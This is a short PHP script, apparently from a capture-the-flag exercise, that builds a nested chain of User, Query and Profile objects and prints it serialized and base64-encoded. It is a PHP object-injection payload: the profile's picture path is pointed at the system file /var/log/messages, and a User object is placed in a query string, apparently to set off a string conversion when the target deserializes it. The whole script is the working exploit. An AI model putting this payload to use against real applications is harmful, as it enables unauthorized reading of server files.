<?php

class User {
    public $profile;
    public $posts = array();
}

class Profile {
    public $username = 'haha';
    public $picture_path = "images/real_programmers.png";
}

class Query {
    public $query_string = "";
    public $args;
}

$prof = new Profile();
$prof->picture_path = "/var/log/messages";
$tostr = new User();
$tostr->profile = $prof;
$q = new Query();
$q->query_string = $tostr;
$source = new User();
$source->profile = $q;

echo base64_encode(serialize($source));